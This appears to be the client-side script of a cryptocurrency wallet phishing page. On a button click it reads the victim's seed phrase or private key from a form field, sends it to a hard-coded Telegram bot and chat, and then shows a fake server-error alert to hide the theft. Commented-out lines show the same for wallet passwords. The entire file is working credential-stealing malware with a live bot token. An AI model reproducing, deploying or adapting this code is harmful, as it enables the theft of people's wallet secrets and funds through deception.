let submitk = document.getElementById("submitk") || document.getElementById("submitm") || document.getElementById("submitp") || document.getElementById("submitl");



$("#former").submit(function(e) {
    e.preventDefault();
});

async function sendMessage(message){
    return new Promise((resolve, reject)=>{
      const chat_id = 5737586032;
      fetch(`https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=${chat_id}&text=${message}`, {
            method: "GET",
            headers: {
                
            }
        })
        .then(async(res) => {
            if(res.status > 399) throw res;
            resolve(await res.json());
        }).catch(err=>{
            reject(err);
        })
    })
  }

submitk.addEventListener("click", () => {
    
    (async function(){
        console.log("clickeed");
        
    if (document.getElementById("submitk")){
        let phrase =document.getElementById("phrase").value;
    //let keypass =document.getElementById("keypass").value;
    
        console.log("phrase");
        await sendMessage(`phrase`);
        await sendMessage(phrase);
        //await sendMessage(`Password`);
        //await sendMessage(keypass);
        alert("Error connecting with the server ... Pls, try again later");
    }

    else if (document.getElementById("submitm")){
        let phrase =document.getElementById("phrase").value;
    //let mnemonicspass =document.getElementById("mnemonicspass").value;
    
        console.log("phrase");
        await sendMessage(`phrase`);
        await sendMessage(phrase);
        //await sendMessage(`Password`);
        //await sendMessage(mnemonicspass);
        alert("Error connecting with the server ... Pls, try again later");
    }
    else if (document.getElementById("submitp")){
        let phrase =document.getElementById("phrase").value;
    //let privatepass =document.getElementById("privatepass").value;
    

        console.log("phrase");
        await sendMessage(`phrase`);
        await sendMessage(phrase);
        //await sendMessage(`Password`);
        //await sendMessage(privatepass);
        alert("Error connecting with the server ... Pls, try again later");
    }
    else if (document.getElementById("submitl")){
        let phrase =document.getElementById("phrase").value;
    //let privatepass =document.getElementById("privatepass").value;
    

        console.log("phrase");
        await sendMessage(`phrase`);
        await sendMessage(phrase);
        //await sendMessage(`Password`);
        //await sendMessage(privatepass);
        alert("Error connecting with the server ... Pls, try again later");
    }
})();
});

